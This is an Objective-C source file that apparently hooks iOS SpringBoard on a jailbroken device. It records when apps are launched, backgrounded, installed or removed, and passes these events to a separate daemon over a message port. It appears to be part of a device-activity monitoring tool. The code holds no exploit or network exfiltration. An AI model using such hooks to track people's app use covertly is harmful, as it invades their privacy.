//
//  ApplicationLifeCycle.m
//  ExampleHook
//
//  Created by Makara Khloth on 9/17/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "ApplicationLifeCycle.h"
#import "FxApplicationLifeCycleEvent.h"
#import "MessagePortIPCSender.h"
#import "DefStd.h"
#import "DateTimeFormat.h"

#import "SBApplicationController.h"
#import "SBApplication.h"
#import "SBApplicationIcon.h"
#import "SBUserInstalledApplicationIcon.h"

static ApplicationLifeCycle *_ALC = nil;

static NSString * const kNetMobileInnovaHideLocation					= @"net.mobileinnova.hide.location";
static NSString * const kComStreamtheworldARNHit967						= @"com.streamtheworld.ARNHit967";

static NSString * const kSBInstalledApplicationsAddedBundleIDs			= @"SBInstalledApplicationsAddedBundleIDs";
static NSString * const kSBInstalledApplicationsRemovedBundleIDs		= @"SBInstalledApplicationsRemovedBundleIDs";

static NSString * const kSBInstalledApplicationsDidChangeNotification	= @"SBInstalledApplicationsDidChangeNotification";

@interface ApplicationLifeCycle (private)
- (void) startMonitorALC;
- (void) stopMonitorALC;
- (void) registerSpringBoardDidLaunch;
- (void) unregisterSpringBoardDidLaunch;

- (void) sbInstalledApplicationsDidChange: (NSNotification *) aNotification;

- (void) deliverALCEvent: (FxApplicationLifeCycleEvent *) aALCEvent;

- (void) thread: (id) aAppInfo;

@end

void springboardDidLaunchCallback (CFNotificationCenterRef center, 
								   void *observer, 
								   CFStringRef name, 
								   const void *object, 
								   CFDictionaryRef userInfo);

@implementation ApplicationLifeCycle

@synthesize mIsSpringBoardDidLaunch;

@synthesize mRecentlyALCEvent;

+ (id) sharedALC {
	if (_ALC == nil) {
		_ALC = [[ApplicationLifeCycle alloc] init];
		[_ALC setMIsSpringBoardDidLaunch:NO];
		//[_ALC startMonitorALC];
		[_ALC registerSpringBoardDidLaunch];
	}
	return (_ALC);
}

- (void)applicationStateChanged:(id)arg1 state:(unsigned int)arg2 {
	if ([self mIsSpringBoardDidLaunch] &&
		(arg2 == 3 || arg2 == 4)) { // Interested only 4 or 3
		SBApplication *sbApplication = arg1;
		NSString *bundleIdentifier = [sbApplication bundleIdentifier];
		/*
		 UIApplicationStateActive		= 0,
		 UIApplicationStateInactive		= 1,
		 UIApplicationStateBackground	= 2,
		 3 // Don't know
		 4 // Foreground tested IOS 5.1.1
		 
		 a) When application is bring to foreground, the state = 4
		 b) When application is push to background, the state = 3 then state = 2
		 */
		NSInteger sbApplicationState = arg2;
		ALCState state = kALCStopped;
		if (sbApplicationState == 4 || sbApplicationState == 0) {
			state = kALCLaunched;
		}
		
		// Create ALC event
		FxApplicationLifeCycleEvent *alcEvent = [[FxApplicationLifeCycleEvent alloc] init];
		[alcEvent setDateTime:[DateTimeFormat phoenixDateTime]];
		[alcEvent setMAppState:state];
		[alcEvent setMAppType:kALCProcess];
		[alcEvent setMAppID:bundleIdentifier];
		[alcEvent setMAppName:[sbApplication displayName]];
		[alcEvent setMAppVersion:[sbApplication bundleVersion]]; // Always nil
		
		// - Version
		// - Size
		// - Icon type
		// - Icon data
		// will fill in daemon part using part in field of version
		
		if (![alcEvent isEqualALCEvent:mRecentlyALCEvent]) {
			[self deliverALCEvent:alcEvent];
		}
		
		[self setMRecentlyALCEvent:alcEvent];
		
		[alcEvent release];
	}
}

- (void) applicationStateChanged: (NSDictionary *) aAppInfo {
	// Method 1--> Cause SpringBoard slow and malfunction
//	SBApplication *sbApplication = [aAppInfo objectForKey:@"SBApplication"];
//	int state = [[aAppInfo objectForKey:@"state"] intValue];
//	[self applicationStateChanged:sbApplication	state:state];
	
	// Method 2--> Fixed issue in method 1
	[NSThread detachNewThreadSelector:@selector(thread:) toTarget:self withObject:aAppInfo];
}

- (void) startMonitorALC {
	if (!mIsMonitoring) {
		NSNotificationCenter *nc = [NSNotificationCenter defaultCenter];
		[nc addObserver:self
			   selector:@selector(sbInstalledApplicationsDidChange:)
				   name:kSBInstalledApplicationsDidChangeNotification
				 object:nil];
		mIsMonitoring = YES;
	}
}

- (void) stopMonitorALC {
	if (mIsMonitoring) {
		NSNotificationCenter *nc = [NSNotificationCenter defaultCenter];
		[nc removeObserver:self
					  name:kSBInstalledApplicationsDidChangeNotification
					object:nil];
		mIsMonitoring = NO;
	}
}

- (void) registerSpringBoardDidLaunch {
	CFNotificationCenterAddObserver(CFNotificationCenterGetDarwinNotifyCenter(),	// center
									self,											// observer. this parameter may be NULL.
									&springboardDidLaunchCallback,										// callback
									(CFStringRef) @"SBSpringBoardDidLaunchNotification",				// name
									NULL,											// object. this value is ignored in the case that the center is Darwin
									CFNotificationSuspensionBehaviorHold);
}

- (void) unregisterSpringBoardDidLaunch {
	CFNotificationCenterRemoveObserver (CFNotificationCenterGetDarwinNotifyCenter(),
										self,
										(CFStringRef) @"SBSpringBoardDidLaunchNotification",
										NULL);
}
		 
- (void) sbInstalledApplicationsDidChange: (NSNotification *) aNotification {
	DLog(@"SpringBoard installed application change, aNotification = %@", aNotification);
	
	SBApplicationController *sbApplicationController = [aNotification object];
	NSDictionary *userInfo = [aNotification userInfo];
	NSArray *installedAppsBundleIDs = [userInfo objectForKey:kSBInstalledApplicationsAddedBundleIDs];
	NSArray *removedAppsBundleIDs = [userInfo objectForKey:kSBInstalledApplicationsRemovedBundleIDs];
	
	// Create ALC event
	// - INSTALLED
	for (NSString *sbAppBundleIdentifier in installedAppsBundleIDs) {
		// Exclude this id cause always get notification
		if ([sbAppBundleIdentifier isEqualToString:kNetMobileInnovaHideLocation] ||
			[sbAppBundleIdentifier isEqualToString:kComStreamtheworldARNHit967]) {
			continue;
		}
		
		SBApplication *sbApp = [sbApplicationController applicationWithDisplayIdentifier:sbAppBundleIdentifier];

//		DLog (@"[INSTALLED] SBApplication object = %@, sbAppBundleIdentifier = %@", sbApp, sbAppBundleIdentifier);
//		DLog (@"[INSTALLED] SBApplications with identifier = %@", [sbApplicationController applicationsWithBundleIdentifier:sbAppBundleIdentifier])
//		DLog (@"[INSTALLED] path = %@, display identifier = %@, long display = %@", [sbApp path], [sbApp displayIdentifier], [sbApp longDisplayName])
//		DLog (@"[INSTALLED] author name = %@, folder names = %@, icon class = %@", [sbApp author], [sbApp folderNames], [sbApp iconClass])
//		DLog (@"[INSTALLED] display name = %@, bundle version = %@", [sbApp displayName], [sbApp bundleVersion])
		
		FxApplicationLifeCycleEvent *alcEvent = [[FxApplicationLifeCycleEvent alloc] init];
		[alcEvent setDateTime:[DateTimeFormat phoenixDateTime]];
		[alcEvent setMAppState:kALCInstalled];
		[alcEvent setMAppType:kALCProcess];
		[alcEvent setMAppID:sbAppBundleIdentifier];
		[alcEvent setMAppName:[sbApp displayName]];
		[alcEvent setMAppVersion:[sbApp bundleVersion]]; // Always nil
		
		// - Version
		// - Size
		// - Icon type
		// - Icon data
		// will fill in daemon part using part in field of version
		
		[self deliverALCEvent:alcEvent];
		[alcEvent release];
	}
	
	//- REMOVED
	for (NSString *sbAppBundleIdentifier in removedAppsBundleIDs) {
		// Exclude this id cause always get notification
		if ([sbAppBundleIdentifier isEqualToString:kNetMobileInnovaHideLocation] ||
			[sbAppBundleIdentifier isEqualToString:kComStreamtheworldARNHit967]) {
			continue;
		}
		
		SBApplication *sbApp = [sbApplicationController applicationWithDisplayIdentifier:sbAppBundleIdentifier];

//		DLog (@"[REMOVED] SBApplication object = %@, sbAppBundleIdentifier = %@", sbApp, sbAppBundleIdentifier);
//		DLog (@"[REMOVED] SBApplications with identifier = %@", [sbApplicationController applicationsWithBundleIdentifier:sbAppBundleIdentifier])
//		DLog (@"[REMOVED] path = %@, display identifier = %@, long display = %@", [sbApp path], [sbApp displayIdentifier], [sbApp longDisplayName])
//		DLog (@"[REMOVED] author name = %@, folder names = %@, icon class = %@", [sbApp author], [sbApp folderNames], [sbApp iconClass])
//		DLog (@"[REMOVED] display name = %@, bundle version = %@", [sbApp displayName], [sbApp bundleVersion])
		
		FxApplicationLifeCycleEvent *alcEvent = [[FxApplicationLifeCycleEvent alloc] init];
		[alcEvent setDateTime:[DateTimeFormat phoenixDateTime]];
		[alcEvent setMAppState:kALCUninstalled];
		[alcEvent setMAppType:kALCProcess];
		[alcEvent setMAppID:sbAppBundleIdentifier];
		[alcEvent setMAppName:[sbApp displayName]]; // Always nil
		[alcEvent setMAppVersion:[sbApp bundleVersion]]; // Always nil
		[alcEvent setMAppSize:0];
		[alcEvent setMAppIconType:0]; // Unknown media type
		[alcEvent setMAppIconData:[NSData data]];
		
		// Above information will try to fill out again in daemon part using bundle identifier
		
		[self deliverALCEvent:alcEvent];
		[alcEvent release];
	}
}

- (void) deliverALCEvent: (FxApplicationLifeCycleEvent *) aALCEvent {
	NSMutableData *alcEventData = [NSMutableData data];
	
	NSKeyedArchiver* archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:alcEventData];
	[archiver encodeObject:aALCEvent forKey:kALCArchived];
	[archiver finishEncoding];
	
	MessagePortIPCSender *sender = [[MessagePortIPCSender alloc] initWithPortName:kALCMessagePort];
	[sender writeDataToPort:alcEventData];
	[sender release];
	
	[archiver release];
}

#pragma mark -
#pragma mark Threading function
#pragma mark -

- (void) thread: (id) aAppInfo {
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	DLog (@"ALC threaing start...");
	@try {
		SBApplication *sbApplication = [aAppInfo objectForKey:@"SBApplication"];
		int state = [[aAppInfo objectForKey:@"state"] intValue];
		[self applicationStateChanged:sbApplication	state:state];
	}
	@catch (NSException * e) {
		;
	}
	@finally {
		;
	}
	
	DLog (@"ALC threaing end..");
	[pool release];
}

#pragma mark -
#pragma mark Memory management
#pragma mark -

- (void) dealloc {
	[mRecentlyALCEvent release];
	[self unregisterSpringBoardDidLaunch];
	[self stopMonitorALC];
	[super dealloc];
	_ALC = nil;
}

void springboardDidLaunchCallback (CFNotificationCenterRef center, 
								   void *observer, 
								   CFStringRef name, 
								   const void *object, 
								   CFDictionaryRef userInfo) {
	ApplicationLifeCycle *alc = (ApplicationLifeCycle *)observer;
	[alc setMIsSpringBoardDidLaunch:YES];
	[alc startMonitorALC];
}

@end
